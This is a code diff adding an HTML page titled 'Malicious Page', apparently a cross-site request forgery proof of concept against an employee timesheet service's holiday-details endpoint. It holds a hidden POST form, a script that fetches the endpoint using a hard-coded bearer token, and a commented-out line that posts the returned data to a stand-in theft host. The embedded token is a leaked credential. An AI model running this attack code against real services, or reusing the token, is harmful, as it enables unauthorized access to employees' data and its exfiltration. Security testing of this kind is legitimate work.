@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+    <h1>Malicious Page</h1>
+    <form id="csrfForm" action="https://esstools.net.in/Timesheet/holiday-details" method="POST">
+        <input type="hidden" name="someField" value="someValue">
+    </form>
+    <script>
+
+        fetch("https://esstools.net.in/Timesheet/holiday-details", {
+            method: "GET",
+            headers: {
+                "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI5MDgyMjA0MDA0IiwiZXhwIjoxNzU0NjU3MzUzLCJpYXQiOjE3NTQ2NDY1NTN9.vBmShlWBGqO2WvgrX52qvawpOSSH8JUZIAKthM6UWuw"
+            }
+        })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Holiday Data:", data);
+                // fetch("https://malicious.com/steal", { method: "POST", body: JSON.stringify(data) });
+            })
+            .catch(error => console.error("Error:", error));</script>
+</body>
+
+</html>
